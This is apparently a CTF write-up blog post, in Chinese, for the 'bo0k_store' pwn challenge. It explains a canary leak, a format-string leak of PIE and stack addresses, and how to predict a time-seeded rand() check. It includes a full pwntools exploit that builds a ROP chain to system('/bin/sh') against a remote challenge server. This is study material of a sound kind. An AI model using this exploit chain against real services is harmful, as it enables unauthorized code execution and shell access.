---
title: HXCTF-2025-决赛彩蛋
tags:
    - 随机时间
    - pwn
categories:
    - 比赛记录
cover: /img/治不开心药.png
---
# bo0k_store

## ida分析
**先用checksec 看了一下保护机制--全开**

### mian函数
![image-20250525114939255](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525114939255.png)
1.可以看到，会循环调用menu，进行选择进入不同的book_store.
2.当v3=1668508013时，是另一题的彩蛋，不用管他。
3.按照1 2 3 的顺序依次查看各个选项的内容。

### 选项1--b0ok_store
![image-20250525115233521](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525115233521.png)
1.两次输入0x19字节。为什么呢？熟悉的同学可能会想到，第一次覆盖canary高字节，然后再改回去。所以这个地方是留个我们泄露canary的。应该是的
2.同时注意到这个b0ok_times,它的初始值为1，所以只有一次机会利用这个选项。

### 选项2--b00k_store
![image-20250525115622638](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525115622638.png)
1.熟悉的格式化字符串漏洞，8字节的大小还是太长了，可以泄露很多东西。
2.具体怎么使用还是需要动调看栈上有什么数据可以泄露。
3.这题目是开启了所有保护机制，所以极有可能是用来泄露pie 和 stack 的。

### 选项3--bo0k_store
![image-20250525120159544](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525120159544.png)
1.本题的核心重点，来了。首先可以看到这里的read。老朋友了，0x50的读入，有0x28的空间留给我们去rop，应该是利用这里泄露libc再返回执行system。
2.但是这里有一个随机数，我们需要正确的输入随机数，才能顺利的继续执行。那么我们要如何绕过这个可恶的随机数呢？

## rand 伪随机数
### 方法1--ctypes
[CTF中的PWN——srand()/rand()漏洞（栈溢出）_ctf rand-CSDN博客](https://blog.csdn.net/weixin_39194641/article/details/103089862)
[随机数利用](https://n0we11.github.io/2023/10/16/PWN中的随机数漏洞/)

1.在这两篇博客当中说的很简单，就是rand()是基于时间戳生成的随机数，所以只要我们用同样的函数，同样的参数，同样的时间，就能得到同样的随机数。
2.所以我们使用ctypes库，调用c的链接库和函数得出应该结果，再把结果输入给本题的程序就行。
3.这种方法，比较看运行的速度? 如果有延迟导致的不同时间，就要尝试几次。

### 方法2--奇技淫巧

[奇思妙想（破解随机数） | 未来大pwn子的blog](https://heshi906.github.io/2023/09/23/奇思妙想（破解随机数）/index.html)
1.这篇博客的方法甚得我心。就是我直接自己也写一个程序，生成10s后的随机数，然后拿这个结果，去输入。后续重复运行题目程序，去撞这个时间。
2.在我的解法中就是利用了这个，与方法1比，这个比较吃手法，因为按的太快，就卡不上10s。按得太慢也卡不上10s 。但是实际操作感觉容错还是挺高的，基本上我每一次都能通，而且远程也没问题。

## gdb 分析
### 找偏移和泄露
![image-20250525122212160](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525122212160.png)
1.选项1是刚好覆盖到canary，没什么好说的，经典手法了。

![image-20250525122423039](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525122423039.png)
1.这里可以泄露栈基址和pie。如果有其他条件配合的话，还可以有更美妙的利用

## 利用思路
1.首先在选项1中泄露canary，再从选项2中拿到pie和stack。这样就可以在选项3中，泄露libc。然后把返回地址设置成通过随机数检验的read的地址，直接读入，就不用第二次输入随机数了。
2.所以，第一次在选项3中的输入需要注意rbp的值不能随意覆盖，必须得是合法的地址。拿到pie之后我们可以把rbp写成bss段上的地址。这样下一次的输入，就会在bss段上。最后leave ret时，会跳转过来继续执行。当然也可以写stack上的某个地址。

## exp
```python
from pwn import *
from ctypes import *
context.log_level='debug'
mode=1
url='43.139.51.42'
port=9999
libc=ELF("./libc.so.6")
#exp=cdll.LoadLibraary("./libc.so.6")
exe=process("./rand")
elf=ELF("./pwn")
# 提前10s 拿到随机数 注意这里结尾有换行符
rand=exe.recvline()[5:]
offset=0x18

def choice(op,io):
	io.recvuntil("You choice: \n")
	io.sendline(str(op))

def leak_stack_pie(io):
	#leak-stack & canary
	choice(2,io)
	payload=b'%9$p%8$p'.ljust(8,b"\x41")
	io.sendafter("What b00k do you want??\n",payload)
	#gdb.attach(io)
	base=int(io.recv(14),16)-0x1989-196
	stack=int(io.recv(14),16)
	print(hex(base))
	print(hex(stack))
	log.success("base-{}".format(hex(base)))
	return base,stack
	
def leak_canary(io):
	choice(1,io)
	payload=b'a'*0x18+b'b'
	io.sendafter("What b0ok do you want??\n",payload)
	io.recvuntil("ab")
	canary=u64(io.recv(7).rjust(8,b"\x00"))
	print(hex(canary))
	io.sendafter("Confirm again\n",b'\x00'*0x19)
	return canary
	
	
def pwn(mode):
	if mode==0 :
		io=process("./pwn")
	else:
		io=remote(url,port)
	
	canary=leak_canary(io)
	base,stack=leak_stack_pie(io)
	# got&plt
	puts_got=elf.got["puts"]+base
	puts_plt=elf.plt["puts"]+base
	# gadget
	pop_rdi=0x13F6+base
	ret=0x13F7+base
	read=0x1878+base
	# leak-libc
	choice(3,io)
	#gdb.attach(io)
	rand
	io.sendafter("Let's get started\n",rand)
	payload=offset*b'a'+p64(canary)
	payload+=p64(elf.bss()+base+0x800)+p64(pop_rdi)
	payload+=p64(puts_got)+p64(puts_plt)+p64(read)
	#io.recvuntil("OK! You are right!!!\n")
	#gdb.attach(io,"b *bo0k_store")
	io.sendafter("What bo0k do you want??\n",payload)
	io.recvuntil("This book is for you\n")
	puts=u64(io.recv(6).ljust(8,b'\x00'))
	print(hex(puts))
	libcbase=puts-libc.sym["puts"]
	#log.success("libc-{}".format(hex(libc)))
	system=libcbase+libc.sym["system"]
	bin_sh=libcbase+0x1d8678
	#rop 
	payload=0x18*b'a'+p64(canary)+p64(canary)+p64(pop_rdi)
	payload+=p64(bin_sh)+p64(ret)+p64(system)
	
	io.send(payload)
	io.interactive()

for i in range(12):
	try:
		pwn(mode)
	except:
		print("again!")
	
```
## rand 源码
**gcc 编译之后才能运行哦**
```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main(){
	srand(time(0)+10);
	int random=rand()%1131796;
	printf("rand:%d\n",random);
}
```